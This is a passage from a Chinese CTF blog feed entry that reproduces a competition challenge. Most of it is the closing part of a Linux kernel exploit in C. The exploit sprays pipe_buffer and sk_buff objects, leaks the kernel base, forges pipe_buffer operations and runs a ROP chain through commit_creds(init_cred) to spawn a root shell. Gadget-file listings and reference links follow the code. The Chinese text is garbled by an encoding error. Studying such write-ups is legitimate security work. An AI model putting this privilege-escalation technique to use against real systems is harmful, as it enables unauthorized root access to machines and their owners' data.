class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;196082&quot;</span>, <span class="number">6</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *)&amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg,</span><br><span class="line">                     <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got pipe_buf_ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_addr = pipe_buf_ptr-&gt;ops;</span><br><span class="line">                kernel_offset = kernel_addr - <span class="number">0xffffffff81e2d980</span>;</span><br><span class="line">                kernel_base = kernel_offset + <span class="number">0xffffffff81000000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%p \033[32m\033[1moffset: \033[0m%p\n&quot;</span>,</span><br><span class="line">           kernel_base, kernel_offset);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff8224aca0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> commit_creds = <span class="number">0xffffffff810bb710</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff811af57d</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> swapgs_iretq = <span class="number">0xffffffff81a010eb</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> push_rsi_pop_rsp_rbx_r12 = <span class="number">0xffffffff8133151b</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_secondary_msg + <span class="number">0x18</span>) = <span class="number">0xffffffff81000390</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (struct pipe_buf_operations *)&amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = push_rsi_pop_rsp_rbx_r12;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rop = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span> *)&amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop++] = pop_rdi;</span><br><span class="line">    rop_chain[rop++] = init_cred;</span><br><span class="line">    rop_chain[rop++] = commit_creds;</span><br><span class="line">    rop_chain[rop++] = swapgs_iretq;</span><br><span class="line">    rop_chain[rop++] = get_shell;</span><br><span class="line">    rop_chain[rop++] = user_cs;</span><br><span class="line">    rop_chain[rop++] = user_rflags;</span><br><span class="line">    rop_chain[rop++] = user_sp;</span><br><span class="line">    rop_chain[rop++] = user_ss;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rop_chain is ready\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;spray sk_buff complete!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230331103838088.png"                      alt="image-20230331103838088"                ></p><p>åæ§½ä¸€ä¸‹ï¼šä¸€é“é¢˜ç›®ç”¨äº†äº”ä¸ªgadgetæ–‡ä»¶ï¼ï¼ï¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">âœ  ctf ls -l | grep gadget</span><br><span class="line">-rw-r--r--   1 tcdy  staff   14478379  3 29 19:14 gadget.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff  325376514  3 29 19:24 gadget2.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff  113547117  3 30 13:43 gadget3.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff   21718691  3 30 14:38 gadget4.txt</span><br><span class="line">-rw-r--r--   1 tcdy  staff    4499639  3 30 15:08 gadget5.txt</span><br></pre></td></tr></table></figure><hr><p>å‚è€ƒé“¾æ¥:<br>    <a class="link"   href="https://arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/" >https://arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/<i class="fas fa-external-link-alt"></i></a><br>    <a class="link"   href="https://elixir.bootlin.com/linux/v5.19/source/ipc/msg.c#L1068" >https://elixir.bootlin.com/linux/v5.19/source/ipc/msg.c#L1068<i class="fas fa-external-link-alt"></i></a><br>é¢˜ç›®é“¾æ¥:<br>    å¢¨æ™šé¸¢ä½¬è‡ªå·±æœ‰é¢˜ç›®é“¾æ¥ï¼Œè¿™é‡Œå°±ä¸ä¸Šä¼ å•¦ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å½“åˆçœ‹åˆ°å¢¨æ™šé¸¢å¤§ä½¬çš„åšå®¢å¯¹è¿™é“é¢˜ç›®çš„æè¿°çš„æ—¶å€™å°±å¯¹è¿™é“é¢˜æš—ç”Ÿæƒ…æ„«äº†ï¼Œå¦‚ä»Šç»ˆäºæ˜¯å¾—ä»¥å¤ç°ã€‚&lt;/p&gt;
&lt;h2 id=&quot;å†…æ ¸åˆ†æ&quot;&gt;&lt;a href=&quot;#å†…æ ¸åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;å†…æ ¸åˆ†æ&quot;&gt;&lt;/a&gt;å†…æ ¸åˆ†æ&lt;/h2&gt;&lt;h3 id=&quot;å‡½æ•°åˆ†æ&quot;</summary>
      
    
    
    
    <category term="æ¯”èµ›å¤ç°" scheme="https://196082.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="msg_msg" scheme="https://196082.github.io/tags/msg-msg/"/>
    
    <category term="sk_buff" scheme="https://196082.github.io/tags/sk-buff/"/>
    
    <category term="pipe_buffer" scheme="https://196082.github.io/tags/pipe-buffer/"/>
    
    <category term="qemu escape" scheme="https://196082.github.io/tags/qemu-escape/"/>
    
  </entry>
  
</feed>
